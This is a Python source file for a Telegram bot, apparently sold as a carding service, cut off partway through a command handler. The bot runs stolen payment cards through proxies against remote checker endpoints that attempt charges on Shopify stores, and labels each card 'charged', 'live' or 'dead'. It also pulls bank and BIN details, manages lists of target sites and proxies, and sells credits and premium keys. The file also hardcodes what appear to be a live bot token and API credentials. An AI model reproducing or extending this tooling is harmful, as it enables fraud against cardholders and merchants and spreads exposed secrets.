from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime, timedelta

# ========== CONFIGURATION ==========
# Multi-VPS round-robin API endpoints – replace placeholders with real IPs
API_ENDPOINTS = [
    'http://VPS1_IP:5000/shopify',
    'http://VPS2_IP:5000/shopify',
]
_api_endpoint_counter = 0

def get_next_api_endpoint():
    global _api_endpoint_counter
    endpoint = API_ENDPOINTS[_api_endpoint_counter % len(API_ENDPOINTS)]
    _api_endpoint_counter += 1
    return endpoint

API_ID = 36806590
API_HASH = 'efb36a882a876315c7eebff3ee1da277'
BOT_TOKEN = '8200036561:AAGd8CXK8gcCSVlw2YXzgonBu03LQ-7j7Hg'

ADMIN_IDS = [7845916818]
PVT_CHANNEL_ID = -1003866637848  # YAHAN APNA PVT CHANNEL ID DALO (Logs channel - SIRF CHARGED HITS JAYENGE)

# Required channels to join
REQUIRED_CHATS = [
    {"link": "https://t.me/hexaxcheckerupdates", "id": None},
    {"link": "https://t.me/hexaxcheckerfeedback", "id": None},
    {"link": "https://t.me/hexaxcheckerchat", "id": None},
]

# Premium Plans with Credits
PLANS = {
    "trial": {"days": 1, "credits": 3000, "price": "2$", "name": "🎁 TRIAL"},
    "bronze": {"days": 3, "credits": 8000, "price": "4$", "name": "🥉 BRONZE"},
    "silver": {"days": 7, "credits": 14000, "price": "8$", "name": "🥈 SILVER"},
    "gold": {"days": 14, "credits": 20000, "price": "12$", "name": "🥇 GOLD"},
    "platinum": {"days": 24, "credits": 30000, "price": "22$", "name": "💎 PLATINUM"},
}

# File paths
PREMIUM_FILE = 'premium.json'
KEYS_FILE = 'keys.json'
CREDITS_FILE = 'credits.json'
CREDIT_KEYS_FILE = 'credit_keys.json'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
BANNED_FILE = 'banned.txt'

# Site filter presets
SITE_FILTERS = {
    "all": {"name": "📋 All Sites", "min": 0, "max": 999999},
    "under5": {"name": "💰 Under $5", "min": 0, "max": 5},
    "under10": {"name": "💰 Under $10", "min": 0, "max": 10},
    "under15": {"name": "💰 Under $15", "min": 0, "max": 15},
    "under20": {"name": "💰 Under $20", "min": 0, "max": 20},
    "under30": {"name": "💰 Under $30", "min": 0, "max": 30},
}

PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088", "🔥": "5999340396432333728", "❌": "6037570896766438989",
    "⚡": "6026367225466720832", "💳": "5971944878815317190", "💠": "5971837723676249096",
    "📝": "6023660820544623088", "🌐": "6026367225466720832", "🎯": "5974235702701853774",
    "🤖": "6057466460886799210", "🤵": "4949560993840629085", "💰": "5971944878815317190",
    "⏸️": "6001440193058444284", "▶️": "6285315214673975495", "🛑": "5420323339723881652",
    "📊": "5971837723676249096", "📦": "6066395745139824604", "📋": "5974235702701853774",
    "🔄": "5971837723676249096", "⏳": "5971837723676249096", "🚀": "6282977077427702833",
    "⚠️": "5420323339723881652", "💎": "6023660820544623088",
}

def premium_emoji(text):
    if not text:
        return text
    placeholders = []
    result = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        placeholder = f"\x00PE{i:02d}\x00"
        placeholders.append((placeholder, doc_id, emoji))
        result = result.replace(emoji, placeholder)
    for placeholder, doc_id, emoji in placeholders:
        result = result.replace(placeholder, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

bot = TelegramClient('hexaxshchkrx_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions = {}
ACTIVE_FILTER = "all"

# ========== CREDITS SYSTEM ==========
def load_credits():
    if not os.path.exists(CREDITS_FILE):
        return {}
    try:
        with open(CREDITS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_credits(credits_data):
    try:
        with open(CREDITS_FILE, 'w', encoding='utf-8') as f:
            json.dump(credits_data, f, indent=4)
    except:
        pass

def get_user_credits(user_id):
    credits_data = load_credits()
    uid = str(user_id)
    if uid not in credits_data:
        credits_data[uid] = 0
        save_credits(credits_data)
        return 0
    return credits_data.get(uid, 0)

def add_credits(user_id, amount):
    credits_data = load_credits()
    uid = str(user_id)
    credits_data[uid] = credits_data.get(uid, 0) + amount
    save_credits(credits_data)
    return True

def remove_credits(user_id, amount):
    credits_data = load_credits()
    uid = str(user_id)
    current = credits_data.get(uid, 0)
    new_amount = max(0, current - amount)
    credits_data[uid] = new_amount
    save_credits(credits_data)
    return True

def deduct_credit(user_id):
    credits_data = load_credits()
    uid = str(user_id)
    current = credits_data.get(uid, 0)
    if current >= 1:
        credits_data[uid] = current - 1
        save_credits(credits_data)
        return True, credits_data[uid]
    return False, current

# ========== CREDIT KEYS SYSTEM ==========
def load_credit_keys():
    if not os.path.exists(CREDIT_KEYS_FILE):
        return {}
    try:
        with open(CREDIT_KEYS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_credit_keys(keys_data):
    try:
        with open(CREDIT_KEYS_FILE, 'w', encoding='utf-8') as f:
            json.dump(keys_data, f, indent=4)
    except:
        pass

def generate_credit_key(amount):
    import string
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    keys_data = load_credit_keys()
    keys_data[key] = {
        'credits': amount,
        'used': False,
        'created_at': datetime.now().isoformat()
    }
    save_credit_keys(keys_data)
    return key

def redeem_credit_key(key, user_id):
    keys_data = load_credit_keys()
    if key not in keys_data:
        return False, "Invalid credit key"
    if keys_data[key]['used']:
        return False, "Key already used"
    
    credits = keys_data[key]['credits']
    add_credits(user_id, credits)
    
    keys_data[key]['used'] = True
    keys_data[key]['used_by'] = user_id
    keys_data[key]['used_at'] = datetime.now().isoformat()
    save_credit_keys(keys_data)
    
    return True, credits

# ========== PREMIUM KEYS SYSTEM ==========
def load_keys():
    if not os.path.exists(KEYS_FILE):
        return {}
    try:
        with open(KEYS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_keys(keys_data):
    try:
        with open(KEYS_FILE, 'w', encoding='utf-8') as f:
            json.dump(keys_data, f, indent=4)
    except:
        pass

def generate_premium_key(plan_key, days, credits):
    import string
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    keys_data = load_keys()
    keys_data[key] = {
        'type': 'premium',
        'plan': plan_key,
        'days': days,
        'credits': credits,
        'used': False,
        'created_at': datetime.now().isoformat()
    }
    save_keys(keys_data)
    return key

def load_premium_users():
    if not os.path.exists(PREMIUM_FILE):
        return {}
    try:
        with open(PREMIUM_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_premium_users(premium_data):
    try:
        with open(PREMIUM_FILE, 'w', encoding='utf-8') as f:
            json.dump(premium_data, f, indent=4)
    except:
        pass

def is_premium(user_id):
    premium_data = load_premium_users()
    user_data = premium_data.get(str(user_id))
    if not user_data:
        return False
    expiry = datetime.fromisoformat(user_data['expiry'])
    if datetime.now() > expiry:
        del premium_data[str(user_id)]
        save_premium_users(premium_data)
        return False
    return True

def get_user_plan_name(user_id):
    """Get user's plan name"""
    premium_data = load_premium_users()
    user_data = premium_data.get(str(user_id))
    if not user_data:
        return "FREE"
    plan_key = user_data.get('plan_key', '')
    if plan_key and plan_key in PLANS:
        return PLANS[plan_key]['name']
    return "CUSTOM"

def add_premium_user(user_id, plan_key, days, credits):
    premium_data = load_premium_users()
    expiry = datetime.now() + timedelta(days=days)
    premium_data[str(user_id)] = {
        'expiry': expiry.isoformat(),
        'added_at': datetime.now().isoformat(),
        'days': days,
        'credits': credits,
        'plan_key': plan_key
    }
    save_premium_users(premium_data)
    add_credits(user_id, credits)

def redeem_premium_key(key, user_id):
    keys_data = load_keys()
    if key not in keys_data:
        return False, "Invalid premium key"
    if keys_data[key]['used']:
        return False, "Key already used"
    if is_premium(user_id):
        return False, "You already have premium access"
    
    days = keys_data[key]['days']
    credits = keys_data[key]['credits']
    plan_key = keys_data[key]['plan']
    
    add_premium_user(user_id, plan_key, days, credits)
    
    keys_data[key]['used'] = True
    keys_data[key]['used_by'] = user_id
    keys_data[key]['used_at'] = datetime.now().isoformat()
    save_keys(keys_data)
    
    if plan_key == 'custom':
        return True, f"Redeemed custom premium: {days} days + {credits} credits!"
    else:
        return True, f"Redeemed {PLANS[plan_key]['name']} plan! {days} days + {credits} credits!"

# ========== RESOLVE CHAT IDs ==========
async def resolve_chat_ids():
    for chat in REQUIRED_CHATS:
        try:
            entity = await bot.get_entity(chat["link"])
            chat["id"] = entity.id
            print(f"Resolved: {chat['link']} -> {entity.id}")
        except Exception as e:
            print(f"Failed to resolve {chat['link']}: {e}")

# ========== CHECK IF USER JOINED ALL ==========
async def check_user_joined(user_id):
    missing_chats = []
    for chat in REQUIRED_CHATS:
        if chat["id"] is None:
            continue
        try:
            found = False
            async for p in bot.iter_participants(chat["id"]):
                if p.id == user_id:
                    found = True
                    break
            if not found:
                missing_chats.append(chat["link"])
        except:
            missing_chats.append(chat["link"])
    if missing_chats:
        return False, missing_chats
    return True, None

# ========== HELPER FUNCTIONS ==========
def is_admin(user_id):
    return user_id in ADMIN_IDS

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def load_banned_users():
    return get_file_lines(BANNED_FILE)

def is_banned(user_id):
    banned = load_banned_users()
    return str(user_id) in banned

def ban_user(user_id):
    with open(BANNED_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{user_id}\n")

def unban_user(user_id):
    banned = load_banned_users()
    if str(user_id) in banned:
        banned.remove(str(user_id))
        with open(BANNED_FILE, 'w', encoding='utf-8') as f:
            for uid in banned:
                f.write(f"{uid}\n")

def load_sites():
    global ACTIVE_FILTER
    all_sites = get_file_lines(SITES_FILE)
    if not all_sites:
        return []
    if ACTIVE_FILTER == "all":
        return all_sites
    return all_sites

def load_proxies():
    return get_file_lines(PROXY_FILE)

def add_site(site_url):
    sites = load_sites()
    if site_url in sites:
        return False, "Site already exists"
    with open(SITES_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{site_url}\n")
    return True, "Site added successfully"

def add_sites_bulk(site_urls):
    current_sites = load_sites()
    added = []
    already = []
    for site in site_urls:
        if site not in current_sites:
            added.append(site)
        else:
            already.append(site)
    if added:
        with open(SITES_FILE, 'a', encoding='utf-8') as f:
            for site in added:
                f.write(f"{site}\n")
    return added, already

def remove_site(site_url):
    sites = load_sites()
    if site_url not in sites:
        return False, "Site not found"
    new_sites = [s for s in sites if s != site_url]
    with open(SITES_FILE, 'w', encoding='utf-8') as f:
        for site in new_sites:
            f.write(f"{site}\n")
    return True, "Site removed successfully"

# ========== SEND REAL-TIME HIT NOTIFICATION TO USER (FULL FORMAT WITH BIN) ==========
async def send_realtime_hit_to_user(user_id, hit_type, card, response_msg, gateway, price):
    """Send real-time hit notification to user - FULL FORMAT with BIN Info (same as single check)"""
    
    if hit_type == "CHARGED":
        status_emoji = "✅"
        status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
    else:
        status_emoji = "🔥"
        status_text = "𝐋𝐢𝐯𝐞"
    
    # Get BIN Info
    bin_num = card.split('|')[0][:6]
    brand, bin_type, level, bank, country, flag = await get_bin_info(bin_num)
    
    
    
    message = f"""<b>⚡💳 #𝐒𝐇𝐎𝐏𝐈𝐅𝐘 💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!</b>
<blockquote>{status_emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{card}</code></blockquote>
<blockquote>📝 Response: {response_msg[:150]}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway} | 💰 {price}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
<b>━━━━━━━━━━━━━━━━━</b>

🤖 <b>Bot By: <a href="tg://user?id=7845916818">—͟ʜᴇ𝐱ᴀ 𓃠 💮</a></b>"""
    
    try:
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    except Exception as e:
        print(f"Error sending hit to user: {e}")

# ========== PVT CHANNEL LOGS (ONLY CHARGED HITS, WITH PLAN NAME) ==========
async def send_log_to_channel(response_msg, gateway, price, username, user_id):
    """
    Send log to PVT channel - ONLY for CHARGED hits
    Shows user's plan name as well
    """
    header = "⭐ CHARGED HIT ⭐"
    
    if username:
        user_display = username
    else:
        user_display = str(user_id)
    
    # Get user's plan name
    plan_name = get_user_plan_name(user_id)
    
    log_message = f"""<b>{header}</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>Response ━</b> {response_msg[:100]}
<b>Gateway ━</b> {gateway}
<b>Price ━</b> {price}
<b>━━━━━━━━━━━━━━━━━</b>
<b>User ━</b> <a href="tg://user?id={user_id}">{user_display}</a> ({plan_name} USER)"""

    try:
        await bot.send_message(PVT_CHANNEL_ID, premium_emoji(log_message), parse_mode='html')
    except Exception as e:
        print(f"Error sending log to PVT channel: {e}")

# ========== SITE FILTER COMMAND ==========
@bot.on(events.NewMessage(pattern='/filter'))
async def filter_command(event):
    global ACTIVE_FILTER
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        filters_text = "\n".join([f"• <code>/{key}</code> - {val['name']}" for key, val in SITE_FILTERS.items()])
        await event.reply(premium_emoji(f"<b>🎯 Site Price Filters</b>\n\n{filters_text}\n\n<b>Current Filter:</b> {SITE_FILTERS[ACTIVE_FILTER]['name']}\n\n<b>Usage:</b> <code>/filter under10</code>"), parse_mode='html')
        return
    
    filter_key = args[1].lower()
    if filter_key not in SITE_FILTERS:
        await event.reply(premium_emoji(f"❌ Invalid filter. Use: {', '.join(SITE_FILTERS.keys())}"), parse_mode='html')
        return
    
    ACTIVE_FILTER = filter_key
    await event.reply(premium_emoji(f"✅ <b>Filter Updated!</b>\n\nNow using: {SITE_FILTERS[ACTIVE_FILTER]['name']}"), parse_mode='html')

# ========== EXISTING FUNCTIONS ==========
_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:','handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'generic_error', 'empty_submit_response',
)

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(error_msg):
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                data = await res.json()
                brand = data.get('brand', '-')
                bin_type = data.get('type', '-')
                level = data.get('level', '-')
                bank = data.get('bank', '-')
                country = data.get('country_name', '-')
                flag = data.get('country_flag', '')
                return brand, bin_type, level, bank, country, flag
    except Exception:
        return '-', '-', '-', '-', '-', ''

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}

        params = {'cc': card, 'site': site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=120)
        api_url = get_next_api_endpoint()
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api_url, params=params) as resp:
                raw = await resp.json(content_type=None)

        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        gateway = raw.get('Gateway', 'Shopify Payments')
        api_status = raw.get('Status', False)   # boolean from new API
        challenge_url = raw.get('challenge_url', None)

        if is_dead_site_error(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price}

        response_lower = response_msg.lower()

        if 'cloudflare bypass failed' in response_lower:
            return {'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card, 'retry': True, 'gateway': gateway, 'price': price}

        # Map new API boolean Status + Response to internal statuses
        if api_status is True or api_status == 'True' or api_status == 'true':
            if 'order_placed' in response_lower or 'order completed' in response_lower or 'thank you' in response_lower or 'payment successful' in response_lower:
                return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
            else:
                # Live card (3DS_REQUIRED, INSUFFICIENT_FUNDS, etc.)
                return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price, 'challenge_url': challenge_url}
        else:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        error_msg = str(e)
        if is_dead_site_error(error_msg):
            return {'status': 'Site Error', 'message': error_msg, 'card': card, 'retry': True}
        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    last_result = None
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    if not proxies:
         return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}

    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)

        if not result.get('retry'):
            return result

        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)

    if last_result:
        return {'status': 'Dead', 'message': f'Site errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}

    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def update_progress(user_id, message_id, results, current_attempt_count):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
    
    remaining_credits = get_user_credits(user_id)

    progress_text = f"""<b>⚡💳 #—͟ʜᴇ𝐱ᴀ 𓃠 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>📊 Checked: {current_attempt_count}/{results['total']}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<blockquote>💰 Credits Left: {remaining_credits}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>"""

    buttons = [
        [Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
        [Button.inline("🛑 Stop", b"stop")]
    ]

    try:
        await bot.edit_message(user_id, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html')
    except:
        pass

async def send_final_results(user_id, results):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]:
            hits_text += f"✅ <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]:
            hits_text += f"🔥 <code>{r['card']}</code>\n"

    if not hits_text:
        hits_text = "No hits found"

    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
    
    remaining_credits = get_user_credits(user_id)

    summary = f"""<b>⚡💳ㅤ#—͟ʜᴇ𝐱ᴀ 𓃠 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<blockquote>💰 Credits Left: {remaining_credits}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐇𝐢𝐭𝐬</b>
<blockquote>{hits_text}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>

🤖 <b>Bot By: <a href="tg://user?id=7845916818">—͟ʜᴇ𝐱ᴀ 𓃠 💮</a></b>"""

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"shopiii_{user_id}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 70 + "\n")
        await f.write("⚡💳 CC CHECKER RESULTS 💳⚡\n")
        await f.write("Format: CC | Gateway | Price | Message | Site\n")
        await f.write("=" * 70 + "\n\n")

        await f.write(f"✅ CHARGED ({len(results['charged'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write("\n")

        await f.write(f"🔥 APPROVED ({len(results['approved'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write("\n")

        await f.write(f"❌ DEAD ({len(results['dead'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")

    await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')

    try:
        os.remove(filename)
    except:
        pass

async def test_site(site, proxy):
    test_card = "5154623245618097|03|2032|156"
    try:
        params = {'cc': test_card, 'site': site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=60)
        api_url = get_next_api_endpoint()
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api_url, params=params) as resp:
                raw = await resp.json(content_type=None)
        response_msg = raw.get('Response', '').lower()
        if is_dead_site_error(response_msg):
            return {'site': site, 'status': 'dead'}
        return {'site': site, 'status': 'alive'}
    except:
        return {'site': site, 'status': 'dead'}

async def test_proxy(proxy):
    test_card = "5154623245618097|03|2032|156"
    test_site_url = "https://riverbendhomedev.myshopify.com"
    try:
        params = {'cc': test_card, 'site': test_site_url, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=60)
        api_url = get_next_api_endpoint()
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api_url, params=params) as resp:
                raw = await resp.json(content_type=None)
        response_msg = raw.get('Response', '').lower()
        if 'proxy dead' in response_msg or 'invalid proxy format' in response_msg or 'no proxy' in response_msg:
            return {'proxy': proxy, 'status': 'dead'}
        else:
            return {'proxy': proxy, 'status': 'alive'}
    except:
        return {'proxy': proxy, 'status': 'dead'}

# ========== BOT COMMANDS ==========
joined_users = set()
def set_user_joined(user_id):
    joined_users.add(user_id)

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned from using this bot."))
    
    joined, missing_chats = await check_user_joined(user_id)
    if not joined:
        buttons = []
        for link in missing_chats:
            buttons.append([Button.url("📢 Join Channel", link)])
        buttons.append([Button.inline("✅ Joined", b"check_joined")])
        missing_text = "\n".join([f"• <a href='{link}'>Click here to join</a>" for link in missing_chats])
        return await event.reply(premium_emoji(f"<b>⚠️ Access Denied!</b>\n\nYou must join the following channels first:\n\n{missing_text}\n\nThen click 'Joined' button."), buttons=buttons, parse_mode='html')
    
    set_user_joined(user_id)
    is_prem = is_premium(user_id)
    is_adm = is_admin(user_id)
    credits = get_user_credits(user_id)
    plan_name = get_user_plan_name(user_id)
    
    text = f"""<b>⚡💳 Welcome to HEXAAxCHKR! 💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐂𝐂 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>
<blockquote>• /cc card|mm|yy|cvv - Check single CC (1 credit)
• /chk - Reply to .txt file to check cards (1 credit per card)
⚠️NOTE - 
•  No proxy or site setup needed! 
• The bot comes with pre-configured 
   proxies & sites. 
• Just use /cc or /chk and start
   checking cards instantly! 💳⚡</blockquote>

<b>⚡💠 𝐒𝐢𝐭𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>
<blockquote>• /site - Check all sites & remove dead
• /addsite site.com - Add single site
• /addsitetxt - Add sites from .txt file (bulk)
• /rm url - Remove a specific site</blockquote>
<b>⚡💠 𝐏𝐫𝐨𝐱𝐲 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>
<blockquote>• /proxy - Check all proxies & remove dead
• /addproxy - Add proxies (one per line)
• /chkproxy proxy - Check single proxy
• /rmproxy proxy - Remove single proxy
• /rmproxyindex 1,2,3 - Remove by index
• /clearproxy - Remove all proxies
• /getproxy - Get all proxies</blockquote>
<b>⚡💠 𝐂𝐫𝐞𝐝𝐢𝐭𝐬 & 𝐊𝐞𝐲𝐬</b>
<blockquote>• /redeem KEY - Redeem premium key (Premium + Credits)
• /redeemcredit KEY - Redeem credit key (Only credits)
• /plans - Check premium plans
• /info - Your account details & credits
⚠️JOIN LOGS - https://t.me/+6ZvR2byX9RdhYzll</blockquote>"""
    
    if is_prem:
        premium_data = load_premium_users().get(str(user_id), {})
        expiry = premium_data.get('expiry', 'Unknown')
        if expiry != 'Unknown':
            expiry_dt = datetime.fromisoformat(expiry)
            expiry_str = expiry_dt.strftime('%Y-%m-%d')
        else:
            expiry_str = 'Unknown'
        text += f"\n\n<b>💎 Premium Access Active!</b>\n<b>📋 Plan:</b> {plan_name}\n<b>💰 Credits Available:</b> {credits}\n<b>📅 Expires:</b> {expiry_str}"
    else:
        text += f"\n\n<b>⚠️ Premium required for /cc and /chk commands</b>\n<b>💰 Credits Available:</b> {credits}"
    
    if is_adm:
        text += """\n<b>⚡💠 𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>
<blockquote>• /filter - Set site price filter
• /addpremium user_id plan_name - Add premium with plan
• /addpremiumcustom user_id days credits - Add custom premium
• /removepremium user - Remove premium
• /addcredits user amount - Add credits to user
• /removecredits user amount - Remove credits from user
• /genpremiumkey amount plan - Generate premium keys
• /genpremiumkey amount custom days credits - Generate custom premium keys
• /gencreditkey amount credits - Generate credit-only keys
• /ban user - Ban user
• /unban user - Unban user
• /stats - Bot statistics
• /broadcast msg - Broadcast message to ALL users</blockquote>"""
    
    text += f"\n\n<b>━━━━━━━━━━━━━━━━━</b>\n🤖 <b>Bot By: <a href=\"tg://user?id=7845916818\">—͟ʜᴇ𝐱ᴀ 𓃠 💮</a></b>"
    
    await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.NewMessage(pattern='/info'))
async def info_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    
    credits = get_user_credits(user_id)
    is_prem = is_premium(user_id)
    plan_name = get_user_plan_name(user_id)
    
    if is_prem:
        premium_data = load_premium_users().get(str(user_id), {})
        expiry = premium_data.get('expiry', 'Unknown')
        days_added = premium_data.get('days', 0)
        added_at = premium_data.get('added_at', 'Unknown')
        if expiry != 'Unknown':
            expiry_dt = datetime.fromisoformat(expiry)
            expiry_str = expiry_dt.strftime('%Y-%m-%d %H:%M:%S')
            days_left = (expiry_dt - datetime.now()).days
        else:
            expiry_str = 'Unknown'
            days_left = 0
        
        text = f"""<b>💎 YOUR ACCOUNT INFO 💎</b>
<b>━━━━━━━━━━━━━━━━━</b>

<b>👤 User ID:</b> <code>{user_id}</code>
<b>⭐ Status:</b> <b>PREMIUM</b>
